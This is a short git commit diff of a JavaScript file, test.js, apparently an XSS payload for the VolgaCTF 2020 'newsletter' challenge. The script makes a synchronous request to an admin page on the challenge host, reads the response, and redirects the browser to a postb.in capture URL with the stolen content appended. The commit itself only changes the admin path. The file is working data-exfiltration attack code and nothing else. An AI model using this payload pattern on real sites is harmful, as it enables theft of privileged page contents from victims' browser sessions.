ac8702d7f2ddde26495ad2f2c2fdd6165f6d262d
phulelouch <62769629+phulelouch@users.noreply.github.com>
2020-03-27 15:32:42 -0400

    Add files via upload

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
 var a = new XMLHttpRequest();
-a.open('GET', 'newsletter.q.2020.volgactf.ru/admin', false);
+a.open('GET', 'newsletter.q.2020.volgactf.ru/adminss', false);
 a.send(null);
 b = a.responseText;
 location.href = 'https://postb.in/1585337011882-6569399423897' + escape(b);
